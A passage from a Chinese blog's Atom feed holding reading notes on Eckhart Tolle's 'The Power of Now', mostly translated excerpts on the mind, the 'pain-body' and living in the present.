    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="java" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/java/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="java" scheme="https://www.maonie.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>读书笔记-当下的力量</title>
    <link href="https://www.maonie.top/2024/11/23/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%BD%93%E4%B8%8B%E7%9A%84%E5%8A%9B%E9%87%8F/"/>
    <id>https://www.maonie.top/2024/11/23/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%BD%93%E4%B8%8B%E7%9A%84%E5%8A%9B%E9%87%8F/</id>
    <published>2024-11-23T04:48:41.000Z</published>
    <updated>2024-12-06T01:44:56.665Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="“活在当下”"><a href="#“活在当下”" class="headerlink" title="“活在当下”"></a>“活在当下”</h1><p>本书 面向开悟 脱离思想与痛苦 将当下作为一切 </p><span id="more"></span><h1 id="正文节选"><a href="#正文节选" class="headerlink" title="正文节选"></a>正文节选</h1><h2 id="第一章-你不等于你的大脑"><a href="#第一章-你不等于你的大脑" class="headerlink" title="第一章 你不等于你的大脑"></a>第一章 你不等于你的大脑</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><blockquote><p>开悟（enlightenment）是什么？</p></blockquote><p>  曾经，有个乞丐在路边坐了30多年。一天，一位陌生人经过。这个乞丐机械地举起他的旧棒球帽，喃喃地说：“给点儿吧。”陌生人说：“我没有什么东西可以给你。”然后他问：“你坐着的是什么？”乞丐回答说：“什么都没有，只是一个旧箱子而已，自从我有记忆以来，我就一直坐在它上面。”陌生人问：“你曾经打开过箱子吗？”“没有。”乞丐说，“有什么用？里面什么都没有。”陌生人坚持：“打开箱子看一看。”乞丐这才试着打开箱子。这时令人意想不到的事情发生了，乞丐充满了惊奇与狂喜：箱子里装满了金子。</p><p>  我就是那位没有任何东西可给你，却要求你打开箱子看看的陌生人。我不是让你像这则寓言里的乞丐一样看什么箱子，而是叫你往一个更贴近你自身的地方看：你的内在。</p><p>  我能清晰地听到你说：“可是，我不是个乞丐呀。”</p><p>  那些没有找到他们真正的财富，也就是本体的喜悦以及与它紧密联系在一起的、深刻而不可动摇的宁静的人，就是乞丐，即使他们有很多物质上的财富。他们四处寻找成就、安全感或爱情所残余的欢乐或满足，但是他们不知道自己不仅已经拥有了所有的这些东西，而且还拥有了比这些更为珍贵的东西。</p><p>  “开悟”这个词听起来就像一些超人类成就的玄学，但是，它其实就是一种简单的与本体合一的自然状态。它是一种与不可衡量的、不可摧毁的事物相联系的状态。几乎矛盾的是，它其实就是你自己，但又比你更伟大。它找到了超越你名字和形象的真正本质。如果你不能感觉到这种联系，你就会有一种与自己以及与你周围的世界相分离的幻象。你会有意识或无意识地感到自己就像一个孤立的碎片。然后，你内外部的恐惧、冲突和矛盾也随之产生。</p><p>  我喜欢佛陀将开悟简单地定义为“受苦的终结”（the end of suffering）。在这个定义里没有超人类观念的存在。当然，作为定义，它是不完整的。它仅告诉你开悟的否定性定义：受苦停止。但是，当没有受苦存在时，还剩下什么呢？佛陀对此沉默不语。他的沉默意味着他自己也没有找到答案。他下了一个否定形式的定义，所以你不会认为开悟是一个超人类的成就或不可达到的目标。尽管这样，绝大部分佛教徒仍然没有体会佛陀的苦心，仍然相信开悟是为佛而准备的，而不属于他们，至少在此生中不属于他们。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><blockquote><p>体验这种现实的最大障碍是什么？</p></blockquote><p>  是认同于你的思维，它使人们进行强迫性的思考。不能停止思考是一个可怕的烦恼，由于几乎每一个人都遭受着此种痛苦，而我们又无法意识到这一点，所以这就成了一件很正常的事情。这种不停的思维活动使你无法达到内心的宁静状态。同时，它创造了一个虚假的自我，不断投射出恐惧和苦难的阴影。在下面的章节里我们将详细讨论这个话题。</p><p>  哲学家笛卡尔认为，在他写下名言“我思故我在”时，他已经找到了真理。实际上，他表达了一个最基本的错误：将思考视为存在并且认同于思考。强迫性思考者（其实几乎每个人都是）活在一个分裂的状态——一个充满了问题和冲突的疯狂而复杂的世界、一个反映了我们大脑越来越分裂的世界。开悟是一个圆满的境界，合一而和平，与生命以及它所显化的世界合一，同时，与你最深的自我的未显化的生命，也就是本体合一。开悟不仅是痛苦和身心内外冲突的终结，也是思考的终结，这将会是一次不可思议的解放！</p><p>  思维认同创造了一连串的概念、标签、意象、词语、判断和定义，阻碍了你所有真正的关系。这些东西挡在你和你自己之间、你和其他人之间、你和自然之间、你和上帝之间。就是这些思维创造了一种孤立的幻象，你与其他人完全分离的幻象。因此，你忘却了一个基本的事实，那就是：在我们肉身表相看来是与众生分离的情形之下，你其实是与万物合一的。当我说“你忘却了”，我指的是你已经无法感受到“合一”这个不证自明的事实。也许你相信它是真的，但是你无法感觉到它是真的了。一个信念也许可以被遗忘，但是，你一定要亲身验证它，它才能真正地解放你自己。</p><p>  思维已经变成了一种疾病。当事情失去平衡时，这种疾病就会发生。比如，体内的细胞分裂和繁殖本身没有任何错误，但是当这个过程不顾整个有机体而持续地快速增生时，我们就会得病了。</p><p>  注意：如果思维被正确利用的话，它将是一个超强的工具；但如果利用不当，它的危害则相当大。准确地说，不是你利用思维的方式不对——基本上你根本没有利用它，而是它在利用你。这就是一种病态。你认为你就是你的思维、你的大脑，其实这只是种幻觉，这个工具已然控制了你。</p><pre><code>我不是很赞同你的说法。虽然像大多数人一样，我常常漫无目的地思考，但是我仍然利用我的大脑完成了许多事情，一直以来我都是这样做的。</code></pre><p>  你能解答一个填字谜语或制造一颗原子弹，并不能说明你利用了你的大脑。就像狗喜欢啃骨头一样，大脑喜欢思考问题。这就是为什么它要去玩填字游戏和制造原子弹的原因。你或许对这两个活动都不感兴趣，让我这样问你吧：无论何时，当你想从思维中解放出来的时候，你能做到吗？你找到了停止思考的那个按钮吗？</p><pre><code>你是说完全停止思考吗？不，我做不到，一两分钟或许还可以。</code></pre><p>  那么，就是你的大脑在利用你了。你无意识地认同了它，所以你甚至不知道自己是它的奴隶。这几乎就像你在毫不知情的情况下被它所俘虏，所以你认为思考问题的这个实体就是你自己。从思维中解放出来的开始就是认识到你不是一个思考问题的实体——思考者。认识到这一点能使你很好地观察这个思考者。在你观察这个思考者时，一个更高层次的意识就被激活了。然后，你会开始意识到有很大的一片超越思想的智性，思想只是这个智性的一个小方面。你同样还会认识到所有真正重要的事情，如美貌、爱情、创造力、欢乐、内在的宁静等，都是来自于大脑之外的。你开始觉醒了。</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p> 在街道上，你可能会遇到不断喃喃自语的“疯子”。其实他的行为与你和其他“正常人”区别不大，只是你们没有大声说出来而已。那个声音不停地在评论、推测、批判、比较、抱怨、选择好恶等。这种声音可能与你当下所在的情况无关，它可能是关于过去或未来的一些事情，它可能是在回忆往昔，或是在幻想未来可能发生的事情。它经常想象事情可能会出差错，或产生不利的后果，这就是杞人忧天。有时这种声音还会伴随着一些视觉意象或“心理电影”。即使这种声音与现在的情况相关，它也会以过去的形式来解释它，这是因为声音属于你被制约了的大脑，它是你过去的经历以及你继承下来的集体文化思维模式的结果。所以，你以对过去的看法来判断现在的事情，一定会得到一个完全被歪曲的理解。这个声音是人类自己最大的敌人，这是毫不夸张的。许多人在大脑的折磨下度过一生，任由它攻击、惩罚，并耗尽生命的能量。这就是数不清的灾难、痛苦以及疾病产生的原因。</p><p>  好消息是你能从你的思维中解放出来。这是唯一的真正的解放。现在，你可以采取第一个步骤了——经常倾听你大脑中的声音。特别关注那些重复性的思维模式，那些多年来缠绕你的“旧唱片”。这就是我说的“观察思考者”的含义，换句话说：倾听你脑袋中的声音并作为一个观察者的临在。</p><p>  当你在倾听那种声音时，不要去做任何评判。不要对你所听到的声音做出判断或进行谴责，因为这样做意味着同样的声音又会从后门乘虚而入。你将会很快地认识到：那里有一种声音，而我在这里倾听它，观察它。这是一种自我存在的感觉而不是思维。它超越了你的思维。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>人类一直以来都遭受着痛苦，从他们进入了时间和思维的领域，并丧失了对本体的意识，被痛苦折磨了亿万年；从那时起，他们将自己看成是宇宙中无意义的碎片，断绝了自己和源头及他人之间的联系。</p><p>  只要你认同思维，也就是说，只要你处于无意识状态，痛苦就不可避免。在这里我主要指的是情绪上的痛苦，这也是造成身体上的痛苦和疾病的主要原因。怨憎、仇恨、自卑、内疚、愤怒、抑郁、嫉妒等，即使是最为轻微的不快都是痛苦的各种表现。并且，每一次的欢乐或情绪的高涨在其内部都隐含着痛苦的种子：痛苦是这些欢乐的不可分割的对立面，而这个对立面迟早会显化出来。</p><h2 id="第二章-意识：摆脱痛苦的途径"><a href="#第二章-意识：摆脱痛苦的途径" class="headerlink" title="第二章  意识：摆脱痛苦的途径"></a>第二章  意识：摆脱痛苦的途径</h2><h3 id="别在当下制造更多的痛苦"><a href="#别在当下制造更多的痛苦" class="headerlink" title="别在当下制造更多的痛苦"></a>别在当下制造更多的痛苦</h3><pre><code>没有人能够完全摆脱痛苦和悲哀。难道我们不应该学会与痛苦共存，而不是去摆脱痛苦吗？</code></pre><p>  人类的很大一部分痛苦是没有必要的。只要让未被觉察的思维控制着你的生活，痛苦就会自然而然地产生。</p><p>  通常，当下所产生的痛苦都是源自对现状某种形式的不接受、某种形式的无意识抗拒。从思维的层面来说，这种抗拒以批判的形式存在；从情绪的层面来说，它又以负面情绪的形式显现。痛苦的程度取决于你对当下的抗拒程度以及对思维的认同程度。思维通常否认当下，并试图逃离当下。换句话说，你越是认同自己的思维，你就越感到痛苦。或者可以这样说：你越是接受当下，你受的苦就越少，也越能从小我思维中解脱出来。</p><p>  为什么思维会习惯性地否认或抗拒当下呢？因为在没有时间（过去和未来）的情况下，它无法发挥自己的作用并对你进行控制，所以它视当下时刻为威胁。实际上，思维和时间是密不可分的。</p><p>  想象一下：地球上没有人类，只有动物和植物。这时，仍会有过去和未来的存在吗？这时我们仍然能以任何一种有意义的方式来谈论时间吗？“现在几点？”“今天是几号？”问这种问题将会是毫无意义的，橡树或鹰可能会被问傻了！它们可能会说：“现在几点？现在就是现在啊！除此之外还会有什么呢？”</p><p>  是的，在这个世界上我们需要时间和大脑来生活，但是，当它们控制了我们的生活时，痛苦和悲哀就产生了。</p><p>  为了维持控制，思维不断地利用过去和未来来掩盖当下时刻，从而与当下密不可分的本体的生命力和无限创造潜力就被时间掩盖了，而你的真实本性也被思维混淆了。人类思维中不断积累的时间负担越来越沉重。所有的人都在这种负担下受苦，但是他们又忽视或否认当下这一宝贵的时刻，或认为当下是实现未来目标的一种手段，而未来其实只存于他们的大脑中，是不现实的——人们就这样不断地增加这种负担。人类集体与个人大脑中积累的时间里，也存在了很多过去的残余痛苦。</p><p>   如果你不想再为自己和他人创造痛苦，不想再增加你心中过去的痛苦，那么请你不要再创造时间，或者至少不要创造除了做必要事情之外的时间。如何停止创造时间呢？请你务必认识到，当下时刻是你所拥有的一切，把你的生活重心完全放到当下这一刻，把你先前在时间内流连并短暂地访问当下时刻的做法改为关注当下时刻，只在必要时简单地回顾过去和展望未来。永远对当下说“是”。有什么比对已然存在的东西进行内在的抗拒更徒劳、更疯狂的吗？有什么比反对生命本身，也就是当下，而且永远是当下，更疯狂的吗？向“是”臣服，对生活说“是的”，看看生活是如何为你服务而不是与你为敌的。</p><p>  观察大脑是如何为当下时刻贴上标签以及这个贴标签的过程（也就是不断地批判）是如何创造了痛苦和不幸。通过观察思维的活动，你就能够摆脱抗拒的模式，然后还可以允许当下时刻的存在。这将会使你体验到不为外境所困的内心自由，一种真正的内心的宁静状态。然后，再观察发生了什么事情，并采取必要的或可能的行动。</p><p>  接纳，然后采取行动。不管当下时刻的情况怎样，心甘情愿地接受它，就像它是你选择的一样。总是与它共事，而不是抗拒它，使它成为你的朋友和盟友而不是敌人。这将会不可思议地改变你的整个生活。</p><h3 id="瓦解你的痛苦之身"><a href="#瓦解你的痛苦之身" class="headerlink" title="瓦解你的痛苦之身"></a>瓦解你的痛苦之身</h3><p>  除非你能拥有当下的力量，否则你所体会到的每一个情绪痛苦都会残留一部分，继续在你体内存活。它会与你过去已经存在的痛苦合并，并在你的大脑和身体内扎根。当然，过去的痛苦也包括你孩提时遭受的痛苦，这是因为这个世界的无意识造成的。</p><p>  这种积累起来的痛苦是一个消极的能量场，占据着你的大脑和身体。如果你将它视为存在于你体内的无形的实体，那你就离真理不远了。它就是你情绪的痛苦之身。痛苦之身有两种存在模式：休眠和活跃。在90%的时间内，它可能在你的体内都是处于休眠状态；但是，对一个极端不快乐的人来说，他的痛苦之身可能会100%地处于活跃状态。有些人可能完全生活在痛苦之身的状态下，而有些人则可能偶尔感受到它，比如失恋或与过去的痛苦、失落、身体或情感上的伤害等相关联的情况。任何事情都有可能引发痛苦之身，尤其是当它与你过去的痛苦产生共鸣时。当痛苦之身即将从休眠状态中被激活时，即使是一个念头或与你关系亲密的人的一句不经意的话，都有可能激活它。</p><p>  有些痛苦之身像个吵闹不休的孩子，虽然令人不愉快，但是它的害处相对较小；而有些痛苦之身则非常邪恶，像具有毁灭性的怪兽，或是像恶魔一般。有些会引起身体上的不适，更多的则是引起情感上的不安。有些会攻击你周围与你亲密的人，而有些则会攻击你自己。然后，你有关生活的想法和感情会变得消极并具有自我毁灭性。疾病和意外往往就是这样产生的。有些痛苦之身甚至会驱使遭受它折磨的人去自杀。</p><p>你本以为你了解某人，但某天你突然碰到的他却变成了一个陌生的、狰狞的野兽，这会让你感到非常吃惊。然而，这时关注自己的内在比关注对方来得更重要。观察你内心任何痛苦的迹象，它的表现形式可能是：愤怒、烦躁、忧郁、伤害他人的欲望、生气、沮丧、想在个人关系中制造冲突的冲动等。在它刚从休眠状态被激活的那一刻，你就应该注意到它。</p><p>  痛苦之身要在你的体内生存，就像其他任何一个实体一样，如果你无意识地被它控制，它就能存活下来。然后，它会控制你，变成你，并经由你而活出它自己。它需要从你的体内获取“食物”。它以任何与它能量共振的经历或各种形式创造的痛苦为“食”，这些形式有愤怒、沮丧、恨、哀怨、感情冲突、暴力，甚至是疾病。当它控制你时，它会在你的生活中创造一种经常能激活它能量的情况，以便它继续生存。痛苦只能以痛苦为食，它不能享用欢乐。欢乐对它而言是难以下咽的。</p><p>  一旦你被痛苦所控制，你会想要更多的痛苦。这时你会成为受害者或者迫害者：你要么为别人制造更多的痛苦，要么受痛苦的折磨，或者两者皆是。实际上这两者没什么太大的区别。当然，你不会意识到这点，你可能还会说你不要遭受痛苦。但是，如果你仔细观察的话，你会发现自己的思想和行为都在不断地使自己和别人更加痛苦。如果你真正意识到了这一点，这种思维和行为模式就可能会消失。</p><p>  痛苦之身其实是小我投射出来的阴影，它很害怕你的意识之光。因为一个正常的人是不想受更多的苦的，除非他病了。痛苦之身害怕被你发现。它的生存取决于你对它无意识的认同，以及你面对内在痛苦时，那种无意识的害怕。但是，如果你不面对痛苦，不努力把意识之光带进痛苦中，你将会被迫一次又一次地激活你的痛苦之身。痛苦之身对于你来说就像一个危险的怪物，你甚至不敢直视它。但是我可以肯定地说，它只是一个幻觉，它在你临在的力量下没法存活。</p><p>  很多心灵导师说，所有的痛苦实际上都是一种幻觉，这是真的。问题是：对你来说，这是真的吗？你单凭这样的信念并不会让你从痛苦中解脱。你愿意在你的余生都遭受这种痛苦，然后还坚持说它只是一个幻觉吗？那样你就可以远离痛苦吗？在这里我们所关注的是，你要如何实践这个真理——也就是说，如何让痛苦在你自己的生活中消失。</p><p>  所以，痛苦之身不希望你直接去观察它并认清它。当你观察它，感觉到它在你体内的能量场并关注它时，那种无意识的认同就已经被打破了。这时，一种更高的意识状态产生了，我称它为“临在”（presence）。现在你是这个痛苦之身的见证人或观察者。也就是说，它不会再控制你、假装是你，或在你的体内获取新生的能量了。你已经发现了你自己内在的强大力量，你已经获取了当下的力量。</p><p>  无意识创造了它，意识将它变回原形。圣保罗优美地说出了宇宙的原理：“万物在光明下无所遁形，同时万物在光的照耀下都会转化成光。”就像你不能向黑暗宣战一样，你不能向痛苦之身宣战，这样做只会引发内心的冲突并创造更深的痛苦。所以观察它就足够了。观察它意味着接纳它成为当下时刻事实的一部分。</p><p>  痛苦之身由受困的生命能量构成，这种能量是从你总的生命能量中分离出来的，它通过思维认同的反自然过程暂时地取得自治权。它变得反对生命，就像动物试图去追自己的尾巴一样。你知道我们的文明为什么已经变成了一种自残的文明吗？但是即使自残的力量也仍然是生命的能量。</p><p>  当你开始不再认同痛苦之身，而成为观察者时，痛苦之身还会继续挣扎一段时间，同时还会试图让你再度认同它。虽然你不再通过认同它而给它能量，但是它还是会保持一定的动能，就像转动的轮子一样，即使你不再推它，它也会因为惯性继续转动一会儿。在这个阶段，它可能还会在你身体的不同部位制造一些疼痛或不适，但是这些痛苦不会持续很久。请保持临在状态，对痛苦保持关注，守卫你的内在空间。你需要充分地保持注意力，才能直接地观察痛苦之身并感受它的力量。这样，它就无法再控制你的思维了。当你的思维被痛苦所控制时，你就会再次与它认同，而痛苦之身就会再次通过你的思维获得生存。</p><p>  比如说，如果愤怒一直左右着你的思维，你不停地在想别人对你做的事，或你将要对别人做的事，这时你就无意识地被痛苦所控制了，痛苦之身又成为了“你”。在有愤怒的地方，通常就有痛苦埋伏在其下。或者，当你心情不好时，你开始有了很多消极的思想，并不断地想你的生活是多么糟糕，这时你的想法就和痛苦之身结合，你就会无意识地被痛苦所控制，也很容易遭受痛苦之身的攻击。此处我所说的“无意识”，是指对某个思想或情绪模式的认同，它隐含的意思是：观察者的完全缺席。</p><p>  持久而有意识的关注切断了痛苦之身和思维之间的桥梁，它会带来转化。也就是说，痛苦成为你意识火焰的燃料，结果是意识之火燃烧得更加猛烈。这就是古代炼金术的深奥意义：将金属变成金子，将痛苦转化成意识。内部的分裂被治愈，你又成为圆满的。这样，你接下来要做的就是不再创造更多的痛苦。</p><p>  我来总结一下这个过程：将注意力集中在你内心的感受上，了解到这就是痛苦之身并接受它的存在；别去想它，别让你的感受变成大脑和思维，不要去判断或分析它，别在其中寻找你自己的身份认同；保持临在，继续观察你的内在；不仅要觉知到你情绪上的痛苦，更要觉察那个沉默的观察者。这就是当下的力量，这就是你自己有意识的那种临在的力量。然后，请看看接下来会发生什么事情。</p><h3 id="小我对痛苦之身的认同"><a href="#小我对痛苦之身的认同" class="headerlink" title="小我对痛苦之身的认同"></a>小我对痛苦之身的认同</h3><p>  我刚刚描述的这个过程非常有力，也非常简单。孩子也可以学习这个过程，希望有一天这将成为孩子在学校里所学到的第一件事。一旦你理解了这个原则或可以对比一下你内心所发生的事情，成为一个临在的观察者，并且实际地去验证它，你将会拥有最强有力的摆脱痛苦的转化工具。</p><p>  我们并不否认，当你不再认同你的痛苦之身时，你会遭受强烈的内在抗拒，特别是如果你大半生都强烈地与你的痛苦之身认同，并且从中汲取自我感的话，就更是如此。也就是说你从你的痛苦中创造了一个不幸的自我，并且认为这个由大脑创造的幻觉就是你。在这种情况下，害怕失去自我认同的无意识恐惧，会强烈地抗拒任何摆脱这个思维认同的努力。换句话说，你可能宁愿在痛苦中，与痛苦之身认同，也不愿冒风险去丢失你熟悉的不幸自我而跃入一个未知之中。</p><p>  如果你所遇到的就是这种情况，请观察你内心的这种抗拒，并观察你对痛苦的执着。一定要非常警觉。请观察你从痛苦中获取的兴奋快感，观察你想谈论它或是琢磨它的冲动。如果你对此有觉知的话，这种抗拒将会停止。这时，你可以关注一下痛苦之身，作为一个临在的见证者，并致力于它的转化。</p><p>  只有你自己可以做这种事情，没有人可以替代你。如果你足够幸运能与意识很强的人在一起，并与他们一起感受临在的状态，这将会对你很有帮助。在这种方式下，你自己的意识之光会增强。如果我们把一块刚刚燃烧的木材放在另一块燃烧猛烈的木材旁边时，过一会儿即使它们分开，第一块木材也会燃烧得更强烈。毕竟，火是相同的。心灵导师就充当了这种火的功用。有些超越了大脑层次而能创造并维持一种强烈意识临在的治疗师，也可以起到这样的作用。</p><h2 id="第三章-深深地进入当下"><a href="#第三章-深深地进入当下" class="headerlink" title="第三章 深深地进入当下"></a>第三章 深深地进入当下</h2><h3 id="别在思维中寻找你自己"><a href="#别在思维中寻找你自己" class="headerlink" title="别在思维中寻找你自己"></a>别在思维中寻找你自己</h3><pre><code>在我开悟或变得完全有意识之前，我觉得我仍然需要更多地了解大脑工作的方式。</code></pre><p>  不，你不需要。有关大脑的问题不能在大脑的层面中得到解决。一旦当你理解了基本的思维障碍后，你就没必要再了解或理解太多。对大脑复杂性的研究会使你成为一个很好的心理学家，但是它不会使你超越大脑，就像研究疯狂不足以创造理智一样。你已经理解了无意识状态的基本原理：思维认同。它创造了一个虚假的自我，也就是小我，而这个虚假的自我替代了你真正的自我。你真正的自我是根植于本体之中的。如耶稣所说：“你变成了从葡萄藤上砍下来的一根枝蔓。”</p><p>  小我的需求是无止境的。它感到自己很脆弱，容易受到威胁，所以它一直生活在一种恐惧和缺乏的状态中。一旦你了解了这一点，你就不需要探索它所有的表现形式，也没必要将它转化成复杂的个人问题。当然，小我喜欢你这样做。它通常会寻找一种依托以便加强支持它虚幻的自我感，并且总是将自己和你的问题联系在一起。对于大部分人来说，这就是他们的自我感觉与他们的问题紧密联系在一起的原因。一旦这种情形发生了，他们最不愿做的一件事就是从他们的问题中解脱出来，因为这意味着自我感的丧失。所以，小我喜欢你无意识地大量投资在痛苦和苦难中。</p><p>  因此，一旦你认识到无意识的根本原因是思维认同（当然还包括情感认同），你就可以逐步走出这个阴影了。你可以进入当下，这时，你就会允许思维的存在而不陷入思维之中。大脑本身是没有什么问题的，它是一个很好的工具。但是如果你从大脑思维中寻找你自己并误认为它就是你，那它就会变成一种小我的思维，并且控制你的整个生活。</p><h3 id="任何事物都不能存在于当下时刻之外"><a href="#任何事物都不能存在于当下时刻之外" class="headerlink" title="任何事物都不能存在于当下时刻之外"></a>任何事物都不能存在于当下时刻之外</h3><pre><code>过去和未来难道不真实吗？它们有时看起来比当下更为真实。毕竟，过去决定了我们是谁以及我们现在的思维和行为，并且我们未来的目标决定了我们现在该采取的行动。</code></pre><p>  你还没有把握我所说的内容的实质，因为你在试着用大脑去理解它。大脑是不会理解的。只有你能，请专心地听就好。</p><p>  你可曾在当下之外体验过、做过、思考过或感觉过什么东西？你认为你做得到吗？有什么事情能发生或者存在于当下之外吗？答案很明显，不能。</p><p>  没有任何事情可以发生在过去，所有的事情都发生在当下。</p><p>  也没有任何事情会发生在未来，所有的事情都只发生在当下。</p><p>  过去发生的事情是一个记忆的痕迹，它储存在大脑中，是过去的当下。当你记起过去发生的事情时，你就重新激活了那个记忆——而你是在当下做这件事情的。未来是一个幻象的当下，是思维对未来的投射。当未来来临时，它是以当下的方式到来。当你思考未来时，你也是在当下做这件事情。很明显，过去和未来本身没有现实性。就像月亮本身不会发光一样，它只能反射太阳光，所以过去和未来仅是永恒的当下的光线、力量和现实性的反映。过去和未来的现实性都是从当下借过来的。</p><p>  我在这里所说的内容的本质通过大脑是不可能被理解的。但在你理解它的那一刻，你的意识就会从思维转变到本体，从时间转变到临在。突然，每件事都会充满活力，散发出本体的能量。</p><h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p>所有的消极心态都是由积累了心理时间以及对当下时刻的拒绝所引起的。焦虑、紧张、不安、压力、烦恼——所有形式的恐惧，都是因为对未来过于关注而对当下关注不够所引起的。愧疚、后悔、悲伤、怨恨、痛苦以及所有形式的不宽恕都是由过于关注过去而很少关注当下时刻引起的。</p><p>  大部分人很难相信人可以完全从所有的消极心态中解放出来，然而这正是所有的灵性教材所指出的解脱状态。这种状态不是在虚幻的未来，而是在此时此地。</p><p>  你可能很难认识到时间是造成你的痛苦和问题的原因，你认为痛苦和问题是由你生活中的一些特殊情况引起的。从传统的观念来看，这是对的。但是，除非你解决了大脑不断制造麻烦的功能失调问题，也就是它执意于未来而拒绝当下的问题，否则所有的麻烦都会换汤不换药地重复出现。如果造成你所有问题、痛苦、不幸的原因都在今天奇迹般地消失，但是你还是没有变得更为临在、更有意识，那你很快就会发现相同的问题或痛苦的原因又会如影随形般地出现在你身边。最终，问题只有一个：被时间所限的思维本身。</p><pre><code>我无法相信，我有朝一日能从我的问题中完全地释放出来。</code></pre><p>  你是对的。你永远无法“达到”这种状态，因为你“已经”在那个时间点上了。那就是：现在！</p><p>  在时间中没有救赎。你无法在未来被释放，当下时刻才是你获取自由的关键，所以你只有在当下才能解脱。</p><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p>如果你正在做的事情无法让你感受到喜悦、自在和轻松，这并不意味着你需要改变你正在做的事情，你需要改变的是你做事的方式。如何做事通常比做什么事更为重要。试试看，如果你将注意力更多地放在你正在做的事情上，而不是放在通过做这件事所取得的结果上，会发生什么情况。请将你的注意力全部集中在当下所发生的情况上。这意味着你同样完全接受当下时刻的事实，因为你不可能在完全关注某事的同时又去抗拒它。</p><p>  只要关注当下时刻，你所有的不快乐和挣扎将会消失，你的生活也会充满喜悦和安逸。只要你以当下的觉知来采取行动，无论你做什么，它都会充满美德、关怀和爱——即使是一个最为简单的行动。</p><p>  所以请不要担心你行动的结果——仅仅关注行动本身就好了。行动的结果会自然而然地产生。这是一个非常有效的灵修方法。现存最古老、最优美的灵性教导《薄伽梵歌》（Bhagavad Gita），将对行动结果的不执着称为业力瑜伽（Karma Yoga）。它也被描述成“神圣的行动”。</p><p>  当你不再迫切地想逃离当下，本体的喜悦就会进入你所做的每一件事情之中。当你的注意力转向当下的那一刻，你会感觉到临在、宁静和平和。你不会再为了成就和满足而依赖未来——你不再将未来视为救赎。因此，你将不执着于结果。失败或成功都不会改变你本体的内在状态。你已经发现了生活情境之下的生命了。</p><p>  在没有心理时间的情况下，你的自我感源于本体而不是你的过去。在这个世界上，在你的生活情境层面，你可能会变得很富有，知识很丰富，很成功，很自由，但是在更深的本体状态里，你是圆满和完整的。</p><pre><code>在这种圆满的状态中，我们是否仍然还能或愿意追求外在的目标？</code></pre><p>  当然可以，但是你将不会去幻想未来有任何事情或任何人将会拯救你或使你开心。就你的生活情境而言，你可能还是需要得到或要求一些东西，因为这是一个有形有相的、有得有失的世界。而在更深的层次里，你已经是一个完整的人了。当你能意识到这点时，在你所做的事情里将会有欢乐的能量。从心理时间中解放出来后，你将不再受恐惧、愤怒、不满等的驱动而去追求你的目标，也不会因面对失败的恐惧而变得消极。</p><p>  当你更深的自我感是来自本体，而你也从心理需求的上瘾症中走出来时，无论是你的快乐或自我感都不取决于事情的结果，因此你可以说是从恐惧中解脱了！你不会在一个无常的世界中追求永恒，因为它是一个有形有相的、有得有失、有生有死的世界。你不会要求情境、状况、地点或人物让你快乐，然后如果它们未能达到你的要求你就痛苦。</p><p>  尊重每一件事，却又不在乎这一切。身体形式有生和死，但是你意识到了处于形式之下的永恒的东西。你知道真理是不会受到威胁的。</p><p>  当这变为你的存在状态时，你怎会不取得成功呢？你已经成功了。</p><h2 id="第四章-思维逃避当下的策略"><a href="#第四章-思维逃避当下的策略" class="headerlink" title="第四章 思维逃避当下的策略"></a>第四章 思维逃避当下的策略</h2><h3 id="从不快乐中解脱"><a href="#从不快乐中解脱" class="headerlink" title="从不快乐中解脱"></a>从不快乐中解脱</h3><p>  你是否怨恨你正在做的事情？它可能是你的工作，或者你已经同意了做这件事，并且你正在做，但是你同时又在怨恨和抗拒这件事。你会默默地怨恨与你亲近的人吗？你是否意识到了你因此而散发出来的能量是非常有害的，它会影响你自己以及你周围的人？请仔细观察你的内在。那里是否有一些轻微的怨恨和不情愿的迹象呢？如果有，请从心理以及情绪两个层面去观察它。关于某种情况，你思维所创造的观点是什么？然后请观察你的情绪，这是你身体对这些观点所做出的反应。请感受一下这些情绪。你觉得开心还是烦恼？这是一个你会选择让它进入你内在的能量吗？你有选择吗？</p><p>  也许你被利用了，也许你所参与的活动枯燥无味，也许与你亲近的人不诚实或令人厌烦，但是所有的这些都是无关紧要的。你对于这种情况而产生的思想或情绪是否有理，不会起到任何作用。事实是，你正在抗拒本然。你将当下时刻看成敌人。你在你的内心和外界制造了不快乐和冲突。你的不快乐不仅污染了你的内心世界和你周围人的内心世界，而且还污染了与你不可分割的人类集体的精神。我们这个地球的污染只不过是内心污染的外在投射：上百万个无意识的人没有为他们的内心世界担负起责任。</p><p>  停下你正在做的事情，与相关的人谈话，全面地表达你的感受，或者摆脱由你思维所创造的消极观点，因为你的负面思维除了加强你虚假的自我感之外不会有任何好处。承认它的无益处是非常重要的。消极的心态绝对不是处理任何情况的最好方式。实际上，在大多数情况下，它让你陷入它的陷阱并阻止真实的变化。任何在消极能量之下所做的事情都会被它所污染，并且会创造更多的痛苦、更多的不幸。尤有甚之，任何消极的内心状态都是具有传染性的：不快乐比疾病的传播速度更快、更容易。通过共鸣原则，它会在其他人身上引发潜在的消极心态，除非他们具有免疫能力——高度的意识。</p><p>  你是在污染这个世界还是在清理废渣呢？你应该对你的内在空间负责，就像你该对这个地球负责一样。你的内在如何，外在就如何。如果人类清理了内心的污染，那么他们也就会停止创造其他的污染。</p><pre><code>依你的建议，我们应该如何摆脱这种消极的心态？</code></pre><p>就是丢掉！你是如何丢掉在手中燃烧的煤炭的？你是如何丢掉身上沉重而无用的包袱的？如果你认识到你不想再遭受痛苦的折磨或背负沉重的负担，这时你就可以放下它们了。</p><p>  